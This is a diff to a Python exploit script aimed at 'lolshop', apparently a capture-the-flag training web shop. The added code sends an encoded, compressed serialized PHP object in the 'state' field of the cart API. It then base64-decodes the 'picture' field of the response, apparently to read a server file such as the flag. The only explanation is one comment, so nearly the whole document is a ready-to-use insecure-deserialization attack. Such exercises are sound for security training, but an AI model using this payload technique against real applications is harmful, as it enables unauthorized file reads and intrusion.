@@ -2,33 +2,14 @@ import requests
 import string
 import random
 import re
-
+import base64
 
 url = "http://lolshop.training.jinblack.it"
 
-def find_flag(data):
-	search = re.search("flag{[a-zA-Z1-9_!]+}", data)
-	if search:
-		print(search.group())
-	  
+# in the state field there is an encoded serialization of the Product object
+def exploit(s):
+	data = {"state": "eJx1jkEKwjAQRXuWOUBqYlU6PUS9gZTJKAOahiQFQbx7U5tFNsKsHu8/ZsQLwjXMdqEEeMJPRK0RmoIasTAI9v2Q+bHibnoxbNAgOCG++dLIzBwq0XKkID7J7P75+lz5Xigt4dc2HYJS7X6RKXBq78/podJ733X1LuRq+fW7AteVQrM="} 
+	return s.post(url+"/api/cart.php", data=data).json()
 
-def gen_ran_string(size=15):
-	return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(size))
-
-def create_session(s, n, e):
-	data = {"name": n, "email": e}
-	return s.post(url+"/api/new_session.php", data=data).text
-
-def login(s, u, p):
-	data = {"username": u, "password": p, "log_user": ""}
-	return s.post(url+"/login.php", data=data).text
-
-def upload_file(s, fieldname, file):
-	files = {fieldname: file}
-	return s.post(url+"/upload_user.php", files=files).text
-
-n = gen_ran_string()
-e = gen_ran_string()+"@"+gen_ran_string()
 s = requests.Session()
-
-print(create_session(s, n, e))
+print(base64.b64decode(exploit(s).get("picture")).decode()[:-1])
